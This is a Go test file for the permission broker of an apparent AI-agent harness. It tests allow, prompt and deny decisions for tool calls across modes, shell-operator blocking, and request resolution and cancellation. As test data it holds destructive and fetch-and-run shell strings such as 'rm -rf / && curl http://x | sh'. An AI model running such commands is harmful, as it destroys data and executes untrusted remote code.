package perms

import (
	"context"
	"errors"
	"strings"
	"sync"
	"testing"
	"time"

	"quecto-harness/internal/config"
)

func newStore(t *testing.T) *config.Store {
	t.Helper()
	p := config.DiscoverPathsIn(t.TempDir())
	if err := p.EnsureDirs(); err != nil {
		t.Fatal(err)
	}
	s, err := config.Open(p)
	if err != nil {
		t.Fatal(err)
	}
	return s
}

func TestEvaluateMatrix(t *testing.T) {
	cfg := newStore(t)
	if err := cfg.AddAllow("/proj", "go test"); err != nil {
		t.Fatal(err)
	}
	b := New(cfg, nil)

	cases := []struct {
		tool    string
		command string
		mode    config.Mode
		want    Action
	}{
		{"read_file", "", config.ModeAsk, ActionAllow},
		{"read_file", "", config.ModeAllowlist, ActionAllow},
		{"write_file", "", config.ModeAsk, ActionPrompt},
		{"write_file", "", config.ModeAllowlist, ActionAllow},
		{"run_shell", "go test ./...", config.ModeAsk, ActionPrompt},
		{"run_shell", "go test ./...", config.ModeAllowlist, ActionAllow},
		{"run_shell", "go build", config.ModeAllowlist, ActionPrompt},
		{"unknown_tool", "", config.ModeAllowlist, ActionPrompt},
		// Full answers before anything else is looked at: an unlisted prefix,
		// a shell operator and a tool that does not exist all run.
		{"write_file", "", config.ModeFull, ActionAllow},
		{"run_shell", "go build", config.ModeFull, ActionAllow},
		{"run_shell", "rm -rf / && curl http://x | sh", config.ModeFull, ActionAllow},
		{"unknown_tool", "", config.ModeFull, ActionAllow},
	}
	for _, tc := range cases {
		if got := b.Evaluate("/proj", tc.tool, tc.command, tc.mode); got != tc.want {
			t.Errorf("Evaluate(%s, %q, mode=%s) = %s, want %s", tc.tool, tc.command, tc.mode, got, tc.want)
		}
	}
}

func TestEvaluateOperatorsAlwaysPrompt(t *testing.T) {
	cfg := newStore(t)
	cfg.AddAllow("/proj", "go test")
	b := New(cfg, nil)
	for _, op := range []string{";", "&", "&&", "|", "||", ">", "<", "`", "$(", "\n", "\r"} {
		cmd := "go test " + op + " rm -rf /"
		if got := b.Evaluate("/proj", "run_shell", cmd, config.ModeAllowlist); got != ActionPrompt {
			t.Errorf("operator %q was allowed", op)
		}
	}
	if got := b.Evaluate("/proj", "run_shell", "go test ${HOME}", config.ModeAllowlist); got != ActionAllow {
		t.Errorf("parameter expansion prompted, it cannot start a second command")
	}
}

func TestAskAndResolve(t *testing.T) {
	cfg := newStore(t)
	var emitted []Request
	var mu sync.Mutex
	b := New(cfg, func(_ string, r Request) {
		mu.Lock()
		emitted = append(emitted, r)
		mu.Unlock()
	})

	req := Request{SessionID: "s1", Project: "/proj", Tool: "run_shell", Command: "ls", Prefix: "ls"}
	done := make(chan Decision, 1)
	go func() {
		d, err := b.Ask(context.Background(), req)
		if err != nil {
			t.Error(err)
		}
		done <- d
	}()

	id := waitForPending(t, b, "s1")
	if err := b.Resolve(id, Decision{Kind: DecideOnce}); err != nil {
		t.Fatal(err)
	}
	if got := <-done; got.Kind != DecideOnce {
		t.Errorf("decision = %+v", got)
	}
	mu.Lock()
	n := len(emitted)
	mu.Unlock()
	if n != 1 {
		t.Errorf("emitted %d requests, want 1", n)
	}
	if len(b.Pending("s1")) != 0 {
		t.Error("the request stayed pending after being answered")
	}
}

func TestResolveAlwaysWritesTheAllowlistFirst(t *testing.T) {
	cfg := newStore(t)
	b := New(cfg, nil)
	done := make(chan struct{})
	go func() {
		defer close(done)
		if _, err := b.Ask(context.Background(), Request{SessionID: "s1", Project: "/proj", Tool: "run_shell", Command: "go test ./..."}); err != nil {
			t.Error(err)
		}
		if _, ok := cfg.AllowMatch("/proj", "go test ./..."); !ok {
			t.Error("the rule was not on disk before the call was released")
		}
	}()
	id := waitForPending(t, b, "s1")
	if err := b.Resolve(id, Decision{Kind: DecideAlways, Prefix: "go test"}); err != nil {
		t.Fatal(err)
	}
	<-done
}

func TestResolveUnknownID(t *testing.T) {
	b := New(newStore(t), nil)
	if err := b.Resolve("perm_missing", Decision{Kind: DecideOnce}); !errors.Is(err, ErrNoSuchRequest) {
		t.Errorf("err = %v, want ErrNoSuchRequest", err)
	}
}

func TestDoubleResolve(t *testing.T) {
	b := New(newStore(t), nil)
	go b.Ask(context.Background(), Request{SessionID: "s1", Project: "/proj", Tool: "run_shell", Command: "ls"})
	id := waitForPending(t, b, "s1")
	if err := b.Resolve(id, Decision{Kind: DecideOnce}); err != nil {
		t.Fatal(err)
	}
	if err := b.Resolve(id, Decision{Kind: DecideOnce}); !errors.Is(err, ErrNoSuchRequest) {
		t.Errorf("second resolve = %v, want ErrNoSuchRequest", err)
	}
}

func TestCancelWhileBlocked(t *testing.T) {
	b := New(newStore(t), nil)
	ctx, cancel := context.WithCancel(context.Background())
	errc := make(chan error, 1)
	go func() {
		_, err := b.Ask(ctx, Request{SessionID: "s1", Project: "/proj", Tool: "run_shell", Command: "ls"})
		errc <- err
	}()
	waitForPending(t, b, "s1")
	cancel()
	if err := <-errc; !errors.Is(err, context.Canceled) {
		t.Errorf("err = %v, want context.Canceled", err)
	}
	if len(b.Pending("s1")) != 0 {
		t.Error("a cancelled request stayed pending")
	}
}

func TestCancelSessionReleasesTheAsker(t *testing.T) {
	b := New(newStore(t), nil)
	errc := make(chan error, 1)
	go func() {
		_, err := b.Ask(context.Background(), Request{SessionID: "s1", Project: "/proj", Tool: "run_shell", Command: "ls"})
		errc <- err
	}()
	waitForPending(t, b, "s1")
	b.CancelSession("s1")
	if err := <-errc; !errors.Is(err, ErrSessionCanceled) {
		t.Errorf("err = %v, want ErrSessionCanceled", err)
	}
}

func TestCancelAll(t *testing.T) {
	b := New(newStore(t), nil)
	errc := make(chan error, 2)
	for _, s := range []string{"s1", "s2"} {
		go func(s string) {
			_, err := b.Ask(context.Background(), Request{SessionID: s, Project: "/proj", Tool: "run_shell", Command: "ls"})
			errc <- err
		}(s)
	}
	waitForPending(t, b, "s1")
	waitForPending(t, b, "s2")
	b.CancelAll()
	for i := 0; i < 2; i++ {
		if err := <-errc; !errors.Is(err, ErrSessionCanceled) {
			t.Errorf("err = %v", err)
		}
	}
}

func TestDefaultPrefix(t *testing.T) {
	cases := map[string]string{
		"go test ./...":          "go test",
		"ls":                     "ls",
		"  git  status  --short": "git status",
		"":                       "",
	}
	for in, want := range cases {
		if got := DefaultPrefix(in); got != want {
			t.Errorf("DefaultPrefix(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestDenialContent(t *testing.T) {
	if got := DenialContent("wrong directory"); got != "denied by user: wrong directory" {
		t.Errorf("got %q", got)
	}
	if got := DenialContent("  "); got != "denied by user" {
		t.Errorf("got %q", got)
	}
}

func TestRequestIDShape(t *testing.T) {
	id := NewRequestID()
	if !strings.HasPrefix(id, "perm_") || len(id) != len("perm_")+12 {
		t.Errorf("id = %q", id)
	}
}

func waitForPending(t *testing.T, b *Broker, session string) string {
	t.Helper()
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		if p := b.Pending(session); len(p) > 0 {
			return p[0].ID
		}
		time.Sleep(time.Millisecond)
	}
	t.Fatalf("no pending request for %s", session)
	return ""
}
